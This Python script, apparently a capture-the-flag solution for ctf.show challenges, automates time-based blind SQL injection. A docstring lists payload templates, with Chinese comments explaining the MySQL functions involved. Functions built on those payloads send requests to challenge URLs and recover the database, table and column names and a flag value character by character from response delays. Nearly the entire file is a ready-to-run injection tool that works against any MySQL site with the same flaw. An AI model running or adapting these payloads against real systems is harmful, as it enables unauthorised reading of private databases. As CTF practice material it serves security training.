#!/usr/bin/env python3.6.8
# -*- coding: utf-8 -*-
# @Time    : 2021.8.11
# @Author  : Bohemian
# @File    : sleep_sql.py


import time
import requests

""" payload

获取数据库的长度
payload = "' and if((select length(database()))={},sleep(3),0) and 'a'='a".format(i)


获取数据库名
payload = "' and if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),{},1))={},sleep(4),0) and 'a'='a".format(i,j)


获取数据表名
payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='数据库' limit 0,1),{},1))={},sleep(5),0) and 'a'='a".format(i,j)


获取字段名
payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='数据库' and table_name='数据表' limit 1,1),{},1))={},sleep(5),0) and 'a'='a".format(i,j)


获取字段内容
payload = "' and if(ascii(substr((select 字段 from 数据库.数据表 limit 0,1),{},1))={},sleep(5),0) and 'a'='a".format(i,j)
"""

"""
Length（）函数 返回字符串的长度
substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
Ascii（a）返回字符的ascii码
sleep(n)：将程序挂起一段时间 n为n秒
if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
substr('abc',1,1)
"""

#获取数据库的长度
def sleep_sql_database_len():
    for i in range(1,20):
        url = "http://79cb45c4-66c7-41d0-b579-1659496065f7.challenge.ctf.show:8080/?id=1"
        payload = "' and if((select length(database()))={},sleep(3),0) and 'a'='a".format(i)
        #payload = "' and (select length(database() limit 0,1)={}) and 'a'='a".format(i)
        attackurl = url + payload
        start_time = time.time()
        get_infomation = requests.get(attackurl)
        if time.time() - start_time > 2:
            print("数据库字长为:{}".format(str(i)))
#sleep_sql_database_len()


#获取数据库名
def sleep_sql_database_name():
    kuname = ""
    for i in range(1,9):
        for j in range(96,122):
            url = "http://79cb45c4-66c7-41d0-b579-1659496065f7.challenge.ctf.show:8080/?id=1"
            payload = "' and if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),{},1))={},sleep(4),0) and 'a'='a".format(i,j)
            #payload = "' and if(ascii(substr((a),1,1))={},1,0) and 'a'='a".format(i,j)
            attackurl = url + payload
            #print(attackurl)
            start_time = time.time()
            get_infomation = requests.get(attackurl)
            if time.time() - start_time > 3:
                kuname = kuname + str(chr(j))
                print("数据库为:{}".format(kuname))
                break
#sleep_sql_database_name()


#获取数据表长度
def sleep_sql_table_len():
    for i in range(1,9):
        #for j in range(96,122):
            url = "http://79cb45c4-66c7-41d0-b579-1659496065f7.challenge.ctf.show:8080/?id=1"
            payload = "' and if((select length(table_name) from information_schema.tables where table_schema='ctfshow' limit 0,1)={},sleep(4),1) and 'a'='a".format(i)
            attackurl = url + payload
            #print(attackurl)
            start_time = time.time()
            get_infomation = requests.get(attackurl)
            if time.time() - start_time > 3:
                print("表名长为:{}".format(str(i)))
#sleep_sql_table_len()




#获取数据表名
def sleep_sql_table_name():
    kuname = ""
    for i in range(1,10):
        for j in range(96,123):
            url = "http://645ea9f6-2d05-4bb0-9a28-8c6fb9f5062a.challenge.ctf.show:8080/?id=1"
            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='ctfshow' limit 0,1),{},1))={},sleep(5),0) and 'a'='a".format(i,j)
            attackurl = url + payload
            #print(attackurl)
            start_time = time.time()
            get_infomation = requests.get(attackurl)
            if time.time() - start_time > 3:
                kuname = kuname + str(chr(j))
                print("数据表为:{}".format(kuname))
                break
#sleep_sql_table_name()


#获取字段长度
def sleep_sql_columns_length():
    for i in range(1,10):
        #for j in range(96,122):
            url = "http://25b8914a-d22c-405e-be15-162aed5bb384.challenge.ctf.show:8080/?id=1"
            payload = "' and (select length(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagug' limit 0,1)={} and 'a'='a".format(i)
            attackurl = url + payload
            #print(attackurl)
            start_time = time.time()
            get_infomation = requests.get(attackurl)
            if "You are in" in get_infomation.text:
                print("字段数为:{}".format(str(i)))
                break
#sleep_sql_columns_length()


#获取字段名
def sleep_sql_columns_name():
    kuname = ""
    for i in range(1,10):
        for j in range(48,122):
            url = "http://645ea9f6-2d05-4bb0-9a28-8c6fb9f5062a.challenge.ctf.show:8080/?id=1"
            #if(ascii(substr((select column_name from information_schema.columns where table_schema='ctfshow' and table_name='flagjugg' limit 1,1)
            payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='ctfshow' and table_name='flagug' limit 1,1),{},1))={},sleep(5),0) and 'a'='a".format(i,j)
            attackurl = url + payload
            start_time = time.time()
            get_infomation = requests.get(attackurl)
            if time.time() - start_time > 3:
                kuname = kuname + str(chr(j))
                print("字段为:{}".format(kuname))
                break
#sleep_sql_columns_name()


#获取字段内容长度
def sleep_sql_columns_length():
    for i in range(1,100):
        #for j in range(96,122):
            url = "http://547b5996-9977-4ef9-9f70-6cf233bc6ad0.challenge.ctf.show:8080/?id=1"
            payload = "' and length((select flag423 from ctfshow.flagug limit 0,1))={} and 'a'='a".format(i)
            attackurl = url + payload
            #print(attackurl)
            get_infomation = requests.get(attackurl)
            if "You are in" in get_infomation.text:
                print("字段数为:{}".format(str(i)))
                break
#sleep_sql_columns_length()

#获取字段内容
def sleep_sql_columns_information():
    kuname = ""
    for i in range(1,46):
        for j in range(45,126):
            url = "http://645ea9f6-2d05-4bb0-9a28-8c6fb9f5062a.challenge.ctf.show:8080/?id=1"
            payload = "' and if(ascii(substr((select flag4a23 from ctfshow.flagug limit 0,1),{},1))={},sleep(5),0) and 'a'='a".format(i,j)
            attackurl = url + payload
            #print(attackurl)
            start_time = time.time()
            get_infomation = requests.get(attackurl)
            if time.time() - start_time > 3:
                kuname = kuname + str(chr(j))
                print("字段为:{}".format(kuname))
                break
#sleep_sql_columns_information()
